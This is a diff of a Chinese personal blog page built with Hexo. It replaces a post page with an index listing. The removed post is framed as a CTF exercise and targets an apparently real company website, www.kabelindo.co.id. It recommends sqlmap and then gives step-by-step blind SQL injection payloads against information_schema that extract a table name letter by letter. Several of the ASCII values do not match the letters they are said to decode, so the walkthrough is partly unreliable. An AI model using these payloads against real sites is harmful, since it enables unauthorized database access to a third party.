@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>WEB实战注入 · Fxsir的工作室</title>
+    <title>Fxsir的工作室</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,23 +203,12 @@
 </head>
 
     
-        <body class="post-body">
-    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
-    
-    <div class="banner">
-            <div class="blog-title">
-                <a href="/">Fxsir的工作室.</a>
-            </div>
-            <div class="post-title">
-                <a href="#" class="post-name">WEB实战注入</a>
-            </div>
-    </div>
     
     <a class="home-link" href="/">Fxsir的工作室.</a>
 </header>
@@ -231,68 +220,24 @@
 
 
 
-
-height:95vh;
 ">
     
     <!-- 主页  -->
-    
-    
-    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(https://source.unsplash.com/random/1920x1080)"></div>
+    <div class="site-intro-img" style="background-image: url(/)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
-            
-            WEB实战注入
-            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
-            
-            <!-- 404 -->
-            
         </p>
         <!-- 文章页meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                
-                    <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">367</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
-                    </div>
-                
-                <div class="post-intro-meta">
-                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/04/09</span>
-                    
-                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
-                        <span class="iconfont-archer">&#xe602;</span>
-                        <span id="busuanzi_value_page_pv"></span>
-                    </span>
-                    
-                    <span class="shareWrapper">
-                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
-                        <span class="shareText">Share</span>
-                        <ul class="shareList">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
         
     </div>
 </div>
@@ -393,72 +338,48 @@ height:95vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main post-page">
-    <article class="article-entry">
-        <h3 id="Neko’s-blog"><a href="#Neko’s-blog" class="headerlink" title="Neko’s blog"></a>Neko’s blog</h3><h1 id="WEB进阶-实战2注入"><a href="#WEB进阶-实战2注入" class="headerlink" title="WEB进阶-实战2注入"></a>WEB进阶-实战2注入</h1><p>链接：<a href="http://www.kabelindo.co.id/" target="_blank" rel="noopener">http://www.kabelindo.co.id</a> </p>
-<p>要求是表的最后一个是flag值</p>
-<p>就是一个网站</p>
-<p><img src="http://img02.tooopen.com/images/20140208/sy_54953985664.jpg" alt="小黄人"></p>
-<h5 id="对这个网站进行注入"><a href="#对这个网站进行注入" class="headerlink" title="对这个网站进行注入"></a>对这个网站进行注入</h5><h3 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h3><h4 id="1-SQLMAP直接跑"><a href="#1-SQLMAP直接跑" class="headerlink" title="1.SQLMAP直接跑"></a>1.SQLMAP直接跑</h4><p>得到flag值</p>
-<h4 id="2-手工注入"><a href="#2-手工注入" class="headerlink" title="2.手工注入"></a>2.手工注入</h4><p>这个可以说很坑了，使用常规SQL注入爆出来表看不到最后一个。。。</p>
-<p>上百度查询使用数字型注和盲注，直接转载大牛文章</p>
-<p>盲注</p>
-<p>id=24 and (select count(table_name) from information_schema.tables where table_schema=’u9897uwx_kabel’)=22%23  </p>
-<p>发现有二十二个表  所以   需要 爆出第二十二个表</p>
-<p>接着就按着 盲注一步一步来  （第一个字母，到最后一个字母）</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">and</span> ascii(substr((select table_name from information_schema.tables where table_schema=<span class="string">'u9897uwx_kabel'</span> limit <span class="number">21</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">116</span>%<span class="number">23</span>    t</span><br><span class="line"></span><br><span class="line"> <span class="keyword">and</span> ascii(substr((select table_name from information_schema.tables where table_schema=<span class="string">'u9897uwx_kabel'</span> limit <span class="number">21</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">98</span>%<span class="number">23</span>     b</span><br><span class="line"></span><br><span class="line"> <span class="keyword">and</span> ascii(substr((select table_name from information_schema.tables where table_schema=<span class="string">'u9897uwx_kabel'</span> limit <span class="number">21</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))=<span class="number">110</span>%<span class="number">23</span>    n</span><br><span class="line"></span><br><span class="line"> <span class="keyword">and</span> ascii(substr((select table_name from information_schema.tables where table_schema=<span class="string">'u9897uwx_kabel'</span> limit <span class="number">21</span>,<span class="number">1</span>),<span class="number">4</span>,<span class="number">1</span>))=<span class="number">111</span>%<span class="number">23</span>    o</span><br><span class="line"></span><br><span class="line"> <span class="keyword">and</span> ascii(substr((select table_name from information_schema.tables where table_schema=<span class="string">'u9897uwx_kabel'</span> limit <span class="number">21</span>,<span class="number">1</span>),<span class="number">5</span>,<span class="number">1</span>))=<span class="number">116</span>%<span class="number">23</span>    m</span><br><span class="line"></span><br><span class="line"> <span class="keyword">and</span> ascii(substr((select table_name from information_schema.tables where table_schema=<span class="string">'u9897uwx_kabel'</span> limit <span class="number">21</span>,<span class="number">1</span>),<span class="number">6</span>,<span class="number">1</span>))=<span class="number">116</span>%<span class="number">23</span>    a</span><br><span class="line"></span><br><span class="line"> <span class="keyword">and</span> ascii(substr((select table_name from information_schema.tables where table_schema=<span class="string">'u9897uwx_kabel'</span> limit <span class="number">21</span>,<span class="number">1</span>),<span class="number">7</span>,<span class="number">1</span>))=<span class="number">116</span>%<span class="number">23</span>    x</span><br><span class="line"></span><br><span class="line">到了第八位发现为<span class="number">0</span>，空格    即就是只有七位，终于报完了。。。。。类似 </span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> ascii(substr((select table_name from information_schema.tables where table_schema=<span class="string">'u9897uwx_kabel'</span> limit <span class="number">21</span>,<span class="number">1</span>),<span class="number">8</span>,<span class="number">1</span>))=<span class="number">0</span>%<span class="number">23</span></span><br><span class="line"></span><br><span class="line">经过我的一步一步测试，终于爆出表明 为  tbnomax</span><br></pre></td></tr></table></figure>
-<h5 id="最后输入-flag-tbnomax"><a href="#最后输入-flag-tbnomax" class="headerlink" title="最后输入  flag{tbnomax}"></a>最后输入  flag{tbnomax}</h5>
+            <main class="main index-page">
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/2019/04/25/WEB进阶-实战2注入/">
+            
+                <span>WEB实战注入</span>
+        </a>
+        <div class="abstract-content">
+            WEB进阶-实战2注入链接：http://www.kabelindo.co.id 
+要求是表的最后一个是flag值
+就是一个网站
+
+对这个网站进行注入方法：1.SQLMAP直接跑得到flag值
+2.手工注入这个可以说很坑了，使用常规SQL注入爆出来表看不到最后一个。。。
+上百度查询使用数字型注和盲注，直接转载大牛文章
+盲注
+id=24 and (select count(table_name) from information_schema.tables where table_schema=’u9897uwx_kabel’)=22%23  
+发现有二十二个表  所以   需要 爆出第二...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/04/25</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="CTF">CTF</a>
+    
+</div>
+            
+        </div>
     </article>
-    <!-- license  -->
     
     <!-- paginator  -->
-    <ul class="post-paginator">
-        <li class="next">
-            
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2019/04/25/入坑/" title="致自己和还在努力的人">
-                    <div class="nextTitle">致自己和还在努力的人</div>
-                </a>
-            
-        </li>
-        <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href="/2019/04/09/hello-world/" title="欢迎来到我的博客">
-                    <div class="prevTitle">欢迎来到我的博客</div>
-                </a>
-            
-        </li>
-    </ul>
-    <!-- 评论插件 -->
-    <!-- 来必力City版安装代码 -->
-
-    <div id="lv-container" data-id="city" data-uid="MTAyMC80MzY4MC8yMDIyMA==">
-        <script type="text/javascript">
-            (function (d, s) {
-                var j, e = d.getElementsByTagName(s)[0];
-                if (typeof LivereTower === 'function') { return; }
-                j = d.createElement(s);
-                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
-                j.async = true;
-
-                e.parentNode.insertBefore(j, e);
-            })(document, 'script');
-        </script>
-        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
-    </div>
-
-<!-- City版安装代码已完成 -->
     
-    
-    <!-- partial('_partial/comment/changyan') -->
-    <!--PC版-->
-
-
-    
-    
-
-    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -548,24 +469,6 @@ height:95vh;
     </div>
     <!-- toc -->
     
-    <div class="toc-wrapper" style=
-    
-
-
-
-
-
-
-
-top:95vh;
-
-    >
-        <div class="toc-catalog">
-            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-        </div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Neko’s-blog"><span class="toc-number">1.</span> <span class="toc-text">Neko’s blog</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB进阶-实战2注入"><span class="toc-number"></span> <span class="toc-text">WEB进阶-实战2注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#对这个网站进行注入"><span class="toc-number">0.0.1.</span> <span class="toc-text">对这个网站进行注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方法："><span class="toc-number">1.</span> <span class="toc-text">方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-SQLMAP直接跑"><span class="toc-number">1.1.</span> <span class="toc-text">1.SQLMAP直接跑</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-手工注入"><span class="toc-number">1.2.</span> <span class="toc-text">2.手工注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#最后输入-flag-tbnomax"><span class="toc-number">1.2.1.</span> <span class="toc-text">最后输入  flag{tbnomax}</span></a></li></ol></li></ol></li></ol>
-    </div>
-    
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
     <ul class="sidebar-tabs sidebar-tabs-active-0">
@@ -649,7 +552,7 @@ top:95vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/09</span><a class="archive-post-title" href="/2019/04/09/WEB进阶-实战2注入/">WEB实战注入</a>
+            <span class="archive-post-date">04/25</span><a class="archive-post-title" href="/2019/04/25/WEB进阶-实战2注入/">WEB实战注入</a>
         </li>
     
     </ul></div>
@@ -660,6 +563,8 @@ top:95vh;
         <span class="sidebar-tag-name" data-tags="-测试"><span class="iconfont-archer">&#xe606;</span>-测试</span>
     
         <span class="sidebar-tag-name" data-tags="入坑"><span class="iconfont-archer">&#xe606;</span>入坑</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -696,6 +601,8 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="入坑"><span class="iconfont-archer">&#xe60a;</span>入坑</span>
     
+        <span class="sidebar-category-name" data-categories="CTF"><span class="iconfont-archer">&#xe60a;</span>CTF</span>
+    
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
     <div class="sidebar-categories-list"></div>
@@ -728,8 +635,6 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
-    
-        <script src="/scripts/share.js" async></script>    
      
     <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 <!-- 页面点击小红心 -->
